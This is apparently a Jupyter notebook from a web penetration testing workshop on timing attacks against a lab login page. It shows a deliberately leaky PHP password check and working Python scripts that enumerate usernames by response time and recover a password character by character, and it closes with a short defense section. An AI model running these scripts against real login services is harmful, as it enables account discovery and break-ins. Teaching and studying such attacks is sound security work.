{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# WORKSHOP 1: Web Penetration Testing 1\n",
    "## Part four: general timing attack\n",
    "In this last part, we'll depart from injections to look at a different kind of timing attack. This time, we won't be injecting anything. Instead, we'll rely entirely on server side delays to extract information. Although the specific attack we'll be doing is somewhat artificial, this is very common vulnerability which doesn't receive as much attention as I think it deserves.\n",
    "\n",
    "Here's the webpage:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "        <iframe\n",
       "            width=\"100%\"\n",
       "            height=\"400\"\n",
       "            src=\"http://172.16.4.60/ws1/login-admin.php\"\n",
       "            frameborder=\"0\"\n",
       "            allowfullscreen\n",
       "        ></iframe>\n",
       "        "
      ],
      "text/plain": [
       "<IPython.lib.display.IFrame at 0x7f1b9c6cd6d8>"
      ]
     },
     "execution_count": 2,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "from IPython.display import IFrame, HTML\n",
    "\n",
    "# I'm declaring URL as a global variable because the workshop\n",
    "# is located on a local IP which is subject to change.\n",
    "# Make sure you run this code first to declare the variable.\n",
    "URL = 'http://172.16.4.60/ws1/login-admin.php'\n",
    "\n",
    "IFrame(URL, width='100%', height=400)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Analysis\n",
    "Stop for a bit and think about how the notice might related to part three. It takes a small amount of time to check each character of the password. Every time we get another character right, the delay increases a bit.\n",
    "\n",
    "Here's the PHP. This should just confirm what you now already know:\n",
    "```PHP\n",
    "if (\\$_POST[\"username\"] == \"<username>\") {\n",
    "    \\$charcount = strlen(\\$password1);\n",
    "    \\$failed = False;\n",
    "    for (\\$i=0; \\$i<\\$charcount; \\$i++) {\n",
    "        usleep(<delay>);\n",
    "        if (\\$password1[\\$i] != \\$_POST[\"password\"][\\$i]) {\n",
    "            \\$failed = True;\n",
    "            break;\n",
    "        }\n",
    "    }\n",
    "    if (\\$failed == True) {\n",
    "        echo \"<h2>Login failed</h2>\";\n",
    "    }\n",
    "    else {\n",
    "        usleep(<delay>);\n",
    "        echo \"<h2>Admin Panel</h2>\\nWelcome, <username>. The flag is xxxxxxxxx.<br><br>\\n\";\n",
    "    }\n",
    "}\n",
    "\n",
    "```\n",
    "(Note: the \\$ are due to issues with Jupyter code markdown and MathJax. The actual code has no backslashes)\n",
    "\n",
    "You may notice that I'm censoring the username. Username enumeration is one of the most common variants of the timing attack. OpenSSH suffered from a vulnerability in which attackers could use server response time to determine what users existed on the system until August 2016. It may not sound like much, but if you're trying to brute force into a machine knowing what accounts exist to be brute-forced into is a great place to start."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Attack\n",
    "To save you some time, I'm providing a list of common usernames. I got this list form https://github.com/danielmiessler/SecLists, which has a great collection of pen testing wordlists.\n",
    "\n",
    "The first thing we'll do is try every username with a blank password and see what the response times look like."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "('mysql', 0.005111)\n",
      "('test', 0.005236)\n",
      "('user', 0.005648)\n",
      "('info', 0.005675)\n",
      "('adm', 0.005691)\n",
      "('guest', 0.005894)\n",
      "('admin', 0.005949)\n",
      "('azureuser', 0.00661)\n",
      "('puppet', 0.006807)\n",
      "('ec2-user', 0.006904)\n",
      "('ansible', 0.006952)\n",
      "('pi', 0.007036)\n",
      "('oracle', 0.007049)\n",
      "('vagrant', 0.019405)\n",
      "('ftp', 0.02158)\n",
      "('root', 0.02195)\n",
      "('administrator', 0.056705)\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "unames = [\"root\", \"admin\", \"test\", \"guest\", \"info\", \"adm\",\n",
    "          \"mysql\", \"user\", \"administrator\", \"oracle\", \"ftp\",\n",
    "          \"pi\", \"puppet\", \"ansible\", \"ec2-user\", \"vagrant\",\n",
    "          \"azureuser\"]\n",
    "\n",
    "# I'm putting everything in a list so I can sort it.\n",
    "# This is just to make the output a bit easier to read\n",
    "response_times = []\n",
    "\n",
    "for uname in unames:\n",
    "    post_params = { \"username\" : uname, \"password\" : \"\"}\n",
    "    request = requests.post(URL, data=post_params)\n",
    "    response_times.append((uname, request.elapsed.total_seconds()))\n",
    "\n",
    "for item in sorted(response_times, key=lambda x: x[1]):\n",
    "    print(item)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Notice how much the longest response time, for administrator, distinguishes itself? It took over 50ms to respond, whereas the nearest competitor, root, took only 4ms to respond.\n",
    "\n",
    "So, it seems that the username we're looking for is administrator, and the delay I censored out in the PHP above is around 50ms. On LAN, I've been able to get accurate results with a delay as low as 15ms, but for this workshop I'm sacrificing time for the sake of reliability.\n",
    "\n",
    "Now, we want to get the password for that user. The below code should look very familiar by now."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "t\n",
      "tI\n",
      "tIm\n",
      "tIm3\n",
      "tIm3d\n"
     ]
    }
   ],
   "source": [
    "password_guess = \"\"\n",
    "possible_chars = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890\"\n",
    "\n",
    "iteration = 2\n",
    "\n",
    "while True:\n",
    "    new_character = False\n",
    "    for char in possible_chars:\n",
    "        payload = {\"username\" : \"administrator\", \"password\" : password_guess + char}\n",
    "        \n",
    "        response = requests.post(URL, data=payload)\n",
    "        if response.elapsed.total_seconds() > 0.05 * iteration:\n",
    "            iteration += 1\n",
    "            \n",
    "            password_guess = password_guess + char\n",
    "            print(password_guess)\n",
    "            new_character = True\n",
    "    \n",
    "    if not new_character:\n",
    "        break"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Remember that timing attacks involve a bit of randomness, and random network delays can break the loop. If the password stops popping out halfway through, just run the code again.\n",
    "\n",
    "While you're waiting for the password to be cracked, look over the stuff I've changed. There's a new variable titled \"iteration\", which starts at 2. This is beacuse the first delay is caused by getting the username right. After that, the code looks very similar to what we had in part three. The payload has been substantially simplified because we are not longer doing any injections, but the only other change is the iteration multiplier to the response time check. Every time we get a character right, the delay increases by a further 50ms. The iteration variable increases over time to account for this, keeping our delay where it needs to be.\n",
    "\n",
    "There's another user on this system if you want to work through this attack again. You'll need to use a more complete wordlist, which can be found on the seclists page provided above.\n",
    "\n",
    "### Defense\n",
    "Unfortunately, defending against timing attacks isn't nearly as easy as defending against SQL injection. Any kind of processing your system does will introduce some amount of delay, and if an attacker can measure that delay they can weaponize it. With an accurate enough timer, these kinds of attacks can even be used to break cryptosystems.\n",
    "\n",
    "Additionally, adding random delays isn't enough to completely stop a timing attack even if network delay exceeds processing delay. With enough data, a clever attacker can use statistical analysis to determine which usernames on average have smaller response times.\n",
    "\n",
    "Timing attacks for username enumeration can be dealt with by either ensuring the the time difference between login checks for users that exist and users that don't is either negligable or random."
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
